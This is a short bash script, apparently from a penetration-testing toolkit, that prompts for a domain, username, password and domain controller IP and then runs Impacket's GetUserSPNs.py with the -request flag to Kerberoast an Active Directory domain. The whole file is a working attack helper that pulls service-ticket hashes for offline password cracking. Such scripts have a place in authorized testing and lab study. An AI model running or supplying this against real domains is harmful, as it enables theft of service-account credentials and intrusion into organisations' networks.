#!/bin/bash 

# This command asks for variables and then kerberoasts with the proper syntax 
# 
echo -e "GetUserSPNs.py <domain>/<username>:<password> -dc-ip <IP of DC> -request\n"


read -p "Enter the Domain: " domain


read -p "Enter the username: " username 

read -p "Enter the password: " password

read -p "Enter the target ip address: " ip_address 

python3 GetUserSPNs.py $domain/$username:$password -dc-ip $ip_address -request
echo -e "\n📅 Test Date: $(date)"
